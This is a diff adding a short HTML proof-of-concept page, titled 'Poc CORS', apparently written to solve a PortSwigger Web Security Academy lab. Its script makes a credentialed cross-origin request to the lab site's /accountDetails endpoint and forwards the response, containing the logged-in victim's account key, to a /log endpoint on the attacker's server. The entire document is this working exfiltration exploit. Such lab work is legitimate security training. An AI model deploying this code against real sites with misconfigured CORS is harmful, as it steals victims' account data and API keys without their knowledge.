@@ -1,0 +1,17 @@
+<html>
+    <body>
+        <h1>Poc CORS</h1>
+        <script>
+            var xhr = new XMLHttpRequest();
+            var url = "https://0a08008b0391a2c282741f090069009f.web-security-academy.net"
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == XMLHttpRequest.DONE){
+                    fetch("/log?key=" + xhr.responseText)
+                }
+            }
+            xhr.open('GET', url + "/accountDetails", true);
+            xhr.withCredentials = true;
+            xhr.send(null)
+        </script>
+    </body>
+</html>
